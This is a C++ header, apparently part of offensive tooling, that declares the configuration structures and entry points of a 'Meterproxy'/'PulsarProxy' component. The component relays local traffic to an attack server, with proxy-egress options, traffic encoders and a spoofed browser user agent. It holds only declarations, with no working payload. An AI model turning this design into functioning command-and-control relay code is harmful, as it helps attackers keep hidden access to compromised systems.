#pragma once

#include <iostream>
#include <vector>
#include "Encoders.h"

#define USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"


//Variables pass from the main Pulsar
//to the PulsarProxy payload
typedef struct PULSARPROXY_VARS{
	USHORT	localPort;		//Local port to listen on
	PWCHAR	remoteHost;		//Remote URL to connect to
	PWCHAR	remoteRes;		//Remote resource to request
	USHORT	remotePort;		//Remote port to listen on
}*PPROXY_CONTEXT, PROXY_CONTEXT;


struct METERPROXY_CONFIG {
	unsigned short listen_port;
	WCHAR *attack_server_host;
	WCHAR *remote_resource;
	unsigned short attack_server_port;

	// Egress settings
	LPWSTR *proxy;
	LPWSTR proxy_bypass_list;
	LPWSTR auto_config_url;
	BOOL bConnectDirect;
	BOOL bConnectDefaultProxy;
	BOOL bConnectAutoConfigURL;
	BOOL bUseIESettings;
	DWORD dwProxyAccessType;
	BOOL bMProxyFlags;

	std::vector<ENCODER_FUNC> encoders;
	std::vector<DECODER_FUNC> decoders;
};

struct METERPROXY_REQUEST {
	SOCKET sock;
	int offset;
	BYTE *request_data;
	BOOL bStillReceiving;
	size_t content_length;
};

BOOL InitializeMeterproxyConfig(unsigned short listenPort, char *attackServerHost, unsigned short attackServerPort);
BOOL meterproxy_config_add_encoder(ENCODER_FUNC encoder);
BOOL meterproxy_config_add_decoder(DECODER_FUNC decoder);
void StartMeterproxy();

extern struct METERPROXY_CONFIG g_meterproxy_config;



HANDLE InstallPulsarProxy(USHORT LocalPort, PWCHAR lpRemoteHost, PWCHAR lpRemoteResource, USHORT RemotePort);